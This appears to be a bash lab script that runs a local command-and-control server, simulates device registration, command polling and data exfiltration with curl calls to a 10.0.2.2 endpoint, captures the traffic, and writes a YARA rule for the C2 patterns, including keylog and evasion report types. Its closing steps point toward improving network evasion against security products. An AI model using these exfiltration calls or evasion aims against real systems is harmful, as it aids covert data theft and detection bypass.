#!/bin/bash

# Network Analysis Detection Test

echo "📡 Network Analysis Detection Test"
echo "==============================="

echo "📅 Date: $(date)"
echo "📱 Testing: C2 Communication Patterns"

# 1. Start C2 server
echo -e "\n🖥️ Starting C2 Server:"
cd /root/c2_server/
python3 c2_server.py > /root/detection_analysis/network_analysis/c2_server_network.log 2>&1 &
C2_PID=$!
echo "✅ C2 Server started (PID: $C2_PID)"
sleep 2

# 2. Start network capture
echo -e "\n📡 Starting Network Capture:"
tcpdump -i any -w /root/detection_analysis/network_analysis/network_capture_full.pcap > /dev/null 2>&1 &
TCPDUMP_PID=$!
echo "✅ Network capture started (PID: $TCPDUMP_PID)"

# 3. Simulate C2 communication
echo -e "\n📶 Simulating C2 Communication:"

# Simulate device registration
curl "http://10.0.2.2:8000/register?device_id=test_device&device_info=TestDevice" > /dev/null 2>&1

# Simulate command checking
for i in {1..5}; do
  curl "http://10.0.2.2:8000/command?device_id=test_device" > /dev/null 2>&1
  sleep 2

  # Simulate command execution
  curl "http://10.0.2.2:8000/exfiltrate?device_id=test_device&data_type=test&data=TestData$i" > /dev/null 2>&1
  sleep 2

  # Simulate behavior reports
  curl "http://10.0.2.2:8000/exfiltrate?device_id=test_device&data_type=behavior_report&data=BehaviorData$i" > /dev/null 2>&1
  sleep 2

done

# 4. Analyze network traffic
echo -e "\n📊 Analyzing Network Traffic:"

# Stop network capture
kill $TCPDUMP_PID > /dev/null 2>&1

# Analyze HTTP traffic
echo "🔍 Analyzing HTTP Traffic:"
tshark -r /root/detection_analysis/network_analysis/network_capture_full.pcap -Y "http" -T fields -e http.host -e http.request.uri -e http.request.method -e http.response.code -e http.content_type > /root/detection_analysis/network_analysis/http_traffic_analysis.txt

cat /root/detection_analysis/network_analysis/http_traffic_analysis.txt

# Analyze C2 patterns
echo -e "\n🔍 Analyzing C2 Communication Patterns:"

grep -E "(register|command|exfiltrate)" /root/detection_analysis/network_analysis/http_traffic_analysis.txt > /root/detection_analysis/network_analysis/c2_patterns.txt

cat /root/detection_analysis/network_analysis/c2_patterns.txt

# Analyze traffic statistics
echo -e "\n📈 Analyzing Traffic Statistics:"
tshark -r /root/detection_analysis/network_analysis/network_capture_full.pcap -q -z io,phs > /root/detection_analysis/network_analysis/traffic_stats.txt

cat /root/detection_analysis/network_analysis/traffic_stats.txt

# 5. Detect network signatures
echo -e "\n📜 Detecting Network Signatures:"

# Create network signature rules
cat > /root/detection_analysis/network_analysis/c2_signatures.yar << 'YARA_EOL'
rule C2_Network_Signatures {
    meta:
        description = "Detect C2 network patterns"
        author = "Network Analyst"
        date = "2026-01-17"
    
    strings:
        // C2 registration patterns
        $register1 = "/register?device_id=" nocase
        $register2 = "device_info=" nocase
        
        // C2 command patterns
        $command1 = "/command?device_id=" nocase
        $command2 = "check_commands" nocase
        
        // C2 exfiltration patterns
        $exfil1 = "/exfiltrate?device_id=" nocase
        $exfil2 = "data_type=" nocase
        $exfil3 = "data=" nocase
        
        // C2 data types
        $data_types = /(behavior_report|keylog_report|detection_analysis|evasion_report|device_info|installed_apps)/ nocase
        
        // Encrypted data patterns
        $encrypted = /[A-Za-z0-9+\/=]{20,}/  // Base64-like patterns
        
        // Suspicious user agents
        $user_agent = /(python-requests|curl|okhttp|Dalvik)/ nocase
    
    condition:
        any of them
}
YARA_EOL

# Test network traffic against signatures
echo "Testing network traffic against C2 signatures:"
tshark -r /root/detection_analysis/network_analysis/network_capture_full.pcap -Y "http" -T fields -e http.request.uri -e http.user_agent | yara /root/detection_analysis/network_analysis/c2_signatures.yar - > /root/detection_analysis/network_analysis/network_signatures.txt

cat /root/detection_analysis/network_analysis/network_signatures.txt

# 6. Analyze encryption patterns
echo -e "\n🔐 Analyzing Encryption Patterns:"

# Extract potential encrypted data
grep -E "[A-Za-z0-9+/=]{30,}" /root/detection_analysis/network_analysis/http_traffic_analysis.txt > /root/detection_analysis/network_analysis/encrypted_data.txt

cat /root/detection_analysis/network_analysis/encrypted_data.txt

# 7. Clean up
echo -e "\n🧹 Cleaning Up:"

# Stop C2 server
kill $C2_PID > /dev/null 2>&1

# 8. Summary
echo -e "\n📊 Network Analysis Summary:"
echo "=========================="
echo "✅ C2 Server: Started and tested"
echo "✅ Network Capture: Completed"
echo "✅ C2 Communication: Simulated"
echo "✅ HTTP Traffic: Analyzed"
echo "✅ C2 Patterns: Identified"
echo "✅ Traffic Statistics: Generated"
echo "✅ Network Signatures: Detected"
echo "✅ Encryption Patterns: Analyzed"
echo -e "\n📁 Reports generated:"
echo "   - HTTP Traffic: /root/detection_analysis/network_analysis/http_traffic_analysis.txt"
echo "   - C2 Patterns: /root/detection_analysis/network_analysis/c2_patterns.txt"
echo "   - Traffic Stats: /root/detection_analysis/network_analysis/traffic_stats.txt"
echo "   - Network Signatures: /root/detection_analysis/network_analysis/network_signatures.txt"
echo "   - Encrypted Data: /root/detection_analysis/network_analysis/encrypted_data.txt"
echo -e "\n🔍 Next Steps:"
echo "   1. Review network detection patterns"
echo "   2. Analyze C2 communication stealth"
echo "   3. Study traffic pattern detection"
echo "   4. Identify network signatures used for detection"
echo "   5. Improve network evasion techniques"
echo "   6. Test against network security products"
